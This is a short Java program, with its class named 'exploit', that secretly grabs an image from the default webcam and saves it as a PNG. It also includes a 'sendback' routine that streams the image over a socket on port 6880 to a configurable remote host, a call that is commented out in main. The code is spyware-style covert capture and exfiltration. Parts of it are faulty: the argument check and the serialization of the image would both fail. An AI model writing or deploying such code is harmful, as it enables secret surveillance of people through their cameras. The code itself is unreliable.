import com.github.sarxos.webcam.Webcam;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*; 

public class exploit {

	public static void main(String[] args) throws IOException {
		//Ensure correct arguments are given and create a new file
		if(args[0] == null){
			System.out.println("Invalid filename!");
			return;
		}
		File myFile = new File(args[0]+".png");
		
		//Grab webcam
		Webcam webcam = Webcam.getDefault();
		if (webcam == null) {
			System.out.println("No webcam found!\n");
			return;
		}
		if(!webcam.isOpen())
			webcam.open();
		//Take image and send to host computer 
		BufferedImage image = webcam.getImage();
		//sendback(image);
		
		//Alternatively, take image and save to file locally
		ImageIO.write(image, "PNG", myFile);

	}
	
	public static void sendback(BufferedImage data)
	{
		try{
			//Create connection to a random port. IP should be replaced with the the ip of
			//the computer you wish to send the file to. 
			int port = 6880;
			String ip = "localhost";
			Socket s = new Socket(ip, port);
			//Initialize output stream and start writing file into it
			ObjectOutputStream output = new ObjectOutputStream(s.getOutputStream());            
			output.writeObject(data);
			s.close();
		}
		catch(Exception e){
            System.out.println("Error! Sending failed! /n");
        }
			
	}
}